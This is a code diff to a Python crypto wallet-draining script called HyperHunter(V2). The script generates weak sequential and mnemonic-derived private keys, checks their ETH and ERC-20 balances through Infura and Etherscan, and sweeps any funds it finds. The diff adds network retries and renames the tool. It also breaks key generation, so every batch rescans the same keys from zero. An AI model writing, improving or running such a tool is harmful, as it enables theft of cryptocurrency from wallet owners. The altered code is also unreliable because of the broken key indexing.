@@ -5,6 +5,7 @@ from eth_account import Account
 from datetime import datetime
 import logging
 import sys
+import time
 from typing import Optional, List, Tuple
 import secrets
 import hashlib
@@ -25,20 +26,23 @@ GAS_LIMIT = 21000  # ETH transfer
 GAS_LIMIT_ERC20 = 100000  # ERC-20 transfer
 BATCH_SIZE = 100  # Async batch
 SCAN_DURATION = 3600  # 1 hour, adjust as needed
+RETRY_COUNT = 3  # Network retries
 
 async def get_gas_price(session: aiohttp.ClientSession) -> int:
     """Fetch dynamic gas price from Etherscan."""
-    try:
-        async with session.get(
-            f"https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={ETHERSCAN_API_KEY}"
-        ) as response:
-            data = await response.json()
-            if data["status"] == "1":
-                return Web3.to_wei(int(data["result"]["FastGasPrice"]), 'gwei')
-            return Web3.to_wei(20, 'gwei')  # Fallback
-    except Exception as e:
-        logger.error(f"Error fetching gas: {e}")
-        return Web3.to_wei(20, 'gwei')
+    for _ in range(RETRY_COUNT):
+        try:
+            async with session.get(
+                f"https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey={ETHERSCAN_API_KEY}"
+            ) as response:
+                data = await response.json()
+                if data["status"] == "1":
+                    return Web3.to_wei(int(data["result"]["FastGasPrice"]), 'gwei')
+                return Web3.to_wei(20, 'gwei')  # Fallback
+        except Exception as e:
+            logger.error(f"Gas fetch attempt failed: {e}")
+            await asyncio.sleep(1)
+    return Web3.to_wei(20, 'gwei')
 
 def key_to_hex(key_int: int) -> Optional[str]:
     """Convert integer to 64-char hex key."""
@@ -56,10 +60,10 @@ def mnemonic_key(seed: str) -> Optional[str]:
     except Exception:
         return None
 
-def generate_keys(batch_start: int, batch_size: int) -> List[str]:
+def generate_keys(batch_size: int) -> List[str]:
     """Generate low-entropy and mnemonic-derived keys."""
     keys = []
-    for i in range(batch_start, batch_start + batch_size):
+    for i in range(batch_size):
         # Sequential
         if k := key_to_hex(i):
             keys.append(k)
@@ -87,22 +91,24 @@ async def check_balances(
     address: str, w3: Web3, session: aiohttp.ClientSession
 ) -> Tuple[float, bool]:
     """Check ETH and ERC-20 balances."""
-    try:
-        eth_balance = Web3.from_wei(await w3.eth.get_balance(address), 'ether')
-        erc20_balance = 0.0
-        async with session.get(
-            f"https://api.etherscan.io/api?module=account&action=tokenbalancehistory&address={address}&page=1&offset=10&apikey={ETHERSCAN_API_KEY}"
-        ) as response:
-            data = await response.json()
-            if data["status"] == "1" and data["result"]:
-                erc20_balance = sum(
-                    Web3.from_wei(int(token["balance"]), 'ether') for token in data["result"]
-                )
-        total = eth_balance + erc20_balance
-        return total, total > 0
-    except Exception as e:
-        logger.error(f"Error checking {address}: {e}")
-        return 0.0, False
+    for _ in range(RETRY_COUNT):
+        try:
+            eth_balance = Web3.from_wei(await w3.eth.get_balance(address), 'ether')
+            erc20_balance = 0.0
+            async with session.get(
+                f"https://api.etherscan.io/api?module=account&action=tokenbalancehistory&address={address}&page=1&offset=10&apikey={ETHERSCAN_API_KEY}"
+            ) as response:
+                data = await response.json()
+                if data["status"] == "1" and data["result"]:
+                    erc20_balance = sum(
+                        Web3.from_wei(int(token["balance"]), 'ether') for token in data["result"]
+                    )
+                total = eth_balance + erc20_balance
+                return total, total > 0
+        except Exception as e:
+            logger.error(f"Balance check failed for {address}: {e}")
+            await asyncio.sleep(1)
+    return 0.0, False
 
 async def sweep_funds(pk_hex: str, from_address: str, w3: Web3, session: aiohttp.ClientSession) -> bool:
     """Sweep ETH and ERC-20 tokens."""
@@ -164,14 +170,14 @@ async def scan_worker(keys: List[str], w3: Web3, session: aiohttp.ClientSession)
 
 async def hyper_hunter():
     """Async scan and sweep wallets."""
-    logger.info("Starting HyperHunter")
+    logger.info("Starting HyperHunterV2")
     start_time = time.time()
     key_index = 0
 
     async with aiohttp.ClientSession() as session:
         w3 = Web3(AsyncHTTPProvider(INFURA_URLS[0]))
         while time.time() - start_time < SCAN_DURATION:
-            keys = generate_keys(key_index, BATCH_SIZE)
+            keys = generate_keys(BATCH_SIZE)
             key_index += BATCH_SIZE
 
             hits = await scan_worker(keys, w3, session)
@@ -183,11 +189,11 @@ async def hyper_hunter():
 
             await asyncio.sleep(0.1)  # Batch delay
 
-    logger.info("HyperHunter stopped.")
+    logger.info("HyperHunterV2 stopped.")
 
 if __name__ == "__main__":
     try:
         asyncio.run(hyper_hunter())
     except KeyboardInterrupt:
-        logger.info("HyperHunter stopped by user.")
+        logger.info("HyperHunterV2 stopped by user.")
         sys.exit(0)
